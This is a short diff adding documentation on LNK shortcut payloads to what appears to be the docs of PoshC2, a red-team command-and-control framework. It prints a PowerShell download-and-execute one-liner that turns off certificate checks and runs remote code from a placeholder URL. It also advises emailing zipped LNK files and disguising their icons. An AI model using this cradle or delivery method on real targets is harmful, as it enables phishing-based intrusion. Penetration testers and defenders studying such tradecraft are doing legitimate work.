@@ -1,3 +1,10 @@
 ##########
  LNK File
 ##########
+Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_
+
+An LNK file is an arbitrary shortcut, PoshC2 uses this to create a simple powershell one liner to download and execute the payload::
+
+	powershell.exe -exec bypass -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX (new-object system.net.webclient).downloadstring('https://www.example.com/webapp/static/dksllk')" 
+
+LNK files can be zipped up and sent to a user via malicious email. You can also change the icon of an embedded Lnk file within a zip which will make the shortcut look like any application. 
